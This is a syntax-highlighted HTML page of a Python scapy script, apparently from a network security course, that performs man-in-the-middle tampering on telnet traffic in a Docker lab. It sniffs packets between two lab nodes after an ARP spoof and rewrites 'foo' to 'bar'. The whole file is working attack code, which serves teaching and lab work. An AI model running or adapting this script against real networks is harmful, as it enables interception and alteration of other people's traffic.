@@ -1,0 +1,69 @@
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN">
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<meta name="GENERATOR" content="GNU source-highlight 3.1.9
+by Lorenzo Bettini
+http://www.lorenzobettini.it
+http://www.gnu.org/software/src-highlite">
+<title>arp_mitm.py</title>
+</head>
+<body bgcolor="white">
+<pre><tt><i><font color="#9A1900">#!/usr/bin/env python3</font></i>
+
+<b><font color="#000080">from</font></b> scapy<font color="#990000">.</font>all <b><font color="#000080">import</font></b> <font color="#990000">*</font>
+
+<i><font color="#9A1900"># This program will intercept any data between the firewall node and the</font></i>
+<i><font color="#9A1900"># metasploit node, and change any occurence of 'foo' to 'bar'.  It requires</font></i>
+<i><font color="#9A1900"># that the host this is running on be intercepting traffic, such as via an</font></i>
+<i><font color="#9A1900"># ARP spoof.  It also requires that IP forwarding be disabled</font></i>
+<i><font color="#9A1900"># (set /proc/sys/net/ipv4/ip_forward to 0).</font></i>
+
+<i><font color="#9A1900"># The example this is used for, shown at </font></i>
+<i><font color="#9A1900"># https://aaronbloomfield.github.io/nws/slides/link-layer.html#/mitmarp</font></i>
+<i><font color="#9A1900"># is telneting from the firewall node to the metasploit node.</font></i>
+<i><font color="#9A1900">#</font></i>
+<i><font color="#9A1900"># This code was adapted from code by Weiliang Du from</font></i>
+<i><font color="#9A1900"># https://www.handsonsecurity.net/files/slides/N02_MAC_ARP.pptx</font></i>
+
+<i><font color="#9A1900"># The host we are connecting from -- in our Docker setup, this is the firewall node</font></i>
+FIREWALL_IP <font color="#990000">=</font> <font color="#FF0000">"192.168.100.1"</font>
+FIREWALL_MAC <font color="#990000">=</font> <font color="#FF0000">"02:42:c0:a8:64:01"</font>
+
+<i><font color="#9A1900"># The machine we are telnetting to -- in our Docker setup, this is metasploit</font></i>
+VICTIM_IP <font color="#990000">=</font> <font color="#FF0000">"192.168.100.3"</font>
+VICTIM_MAC <font color="#990000">=</font> <font color="#FF0000">"02:42:c0:a8:64:03"</font>
+
+<b><font color="#0000FF">def</font></b> <b><font color="#000000">spoof_pkt</font></b><font color="#990000">(</font>pkt<font color="#990000">):</font>
+
+	<i><font color="#9A1900"># If the data is going from the victim node (metasploit) to the</font></i>
+	<i><font color="#9A1900"># originating node (firewall), we replace any instance of 'foo' with 'bar'</font></i>
+	<b><font color="#0000FF">if</font></b> pkt<font color="#990000">[</font>IP<font color="#990000">].</font>src <font color="#990000">==</font> VICTIM_IP <b><font color="#0000FF">and</font></b> pkt<font color="#990000">[</font>IP<font color="#990000">].</font>dst <font color="#990000">==</font> FIREWALL_IP<font color="#990000">:</font>
+		newpkt <font color="#990000">=</font> <b><font color="#000000">IP</font></b><font color="#990000">(</font><b><font color="#000000">bytes</font></b><font color="#990000">(</font>pkt<font color="#990000">[</font>IP<font color="#990000">]))</font>
+		<b><font color="#0000FF">del</font></b><font color="#990000">(</font>newpkt<font color="#990000">.</font>chksum<font color="#990000">)</font>
+		<b><font color="#0000FF">del</font></b><font color="#990000">(</font>newpkt<font color="#990000">[</font>TCP<font color="#990000">].</font>payload<font color="#990000">)</font>
+		<b><font color="#0000FF">del</font></b><font color="#990000">(</font>newpkt<font color="#990000">[</font>TCP<font color="#990000">].</font>chksum<font color="#990000">)</font>
+
+		<b><font color="#0000FF">if</font></b> pkt<font color="#990000">[</font>TCP<font color="#990000">].</font>payload<font color="#990000">:</font>
+			data <font color="#990000">=</font> pkt<font color="#990000">[</font>TCP<font color="#990000">].</font>payload<font color="#990000">.</font>load
+			newdata <font color="#990000">=</font> data<font color="#990000">.</font><b><font color="#000000">replace</font></b><font color="#990000">(</font>b<font color="#FF0000">'foo'</font><font color="#990000">,</font>b<font color="#FF0000">'bar'</font><font color="#990000">)</font>
+			<b><font color="#0000FF">if</font></b> newdata <font color="#990000">!=</font> data<font color="#990000">:</font>
+				<b><font color="#0000FF">print</font></b><font color="#990000">(</font><font color="#FF0000">"replaced"</font><font color="#990000">)</font>
+			<b><font color="#000000">send</font></b><font color="#990000">(</font>newpkt<font color="#990000">/</font>newdata<font color="#990000">)</font>
+		<b><font color="#0000FF">else</font></b><font color="#990000">:</font>
+			<b><font color="#000000">send</font></b><font color="#990000">(</font>newpkt<font color="#990000">)</font>
+
+	<i><font color="#9A1900"># If the data is going the other way -- from our originating node</font></i>
+	<i><font color="#9A1900"># (firewall) to the node being telnetted to (metasploit), we do not</font></i>
+	<i><font color="#9A1900"># modify the packets.</font></i>
+	<b><font color="#0000FF">elif</font></b> pkt<font color="#990000">[</font>IP<font color="#990000">].</font>src <font color="#990000">==</font> FIREWALL_IP <b><font color="#0000FF">or</font></b> pkt<font color="#990000">[</font>IP<font color="#990000">].</font>dst <font color="#990000">==</font> VICTIM_IP<font color="#990000">:</font>
+		newpkt <font color="#990000">=</font> <b><font color="#000000">IP</font></b><font color="#990000">(</font><b><font color="#000000">bytes</font></b><font color="#990000">(</font>pkt<font color="#990000">[</font>IP<font color="#990000">]))</font>
+		<b><font color="#0000FF">del</font></b><font color="#990000">(</font>newpkt<font color="#990000">.</font>chksum<font color="#990000">)</font>
+		<b><font color="#0000FF">del</font></b><font color="#990000">(</font>newpkt<font color="#990000">[</font>TCP<font color="#990000">].</font>chksum<font color="#990000">)</font>
+		<b><font color="#000000">send</font></b><font color="#990000">(</font>newpkt<font color="#990000">)</font>
+
+filter <font color="#990000">=</font> <font color="#FF0000">"tcp and (ether src "</font> <font color="#990000">+</font> FIREWALL_MAC <font color="#990000">+</font> <font color="#FF0000">" or ether src "</font> <font color="#990000">+</font> VICTIM_MAC <font color="#990000">+</font> <font color="#FF0000">")"</font>
+pkt <font color="#990000">=</font> <b><font color="#000000">sniff</font></b><font color="#990000">(</font>iface<font color="#990000">=</font><font color="#FF0000">'eth1'</font><font color="#990000">,</font> filter<font color="#990000">=</font>filter<font color="#990000">,</font> prn<font color="#990000">=</font>spoof_pkt<font color="#990000">)</font>
+</tt></pre>
+</body>
+</html>
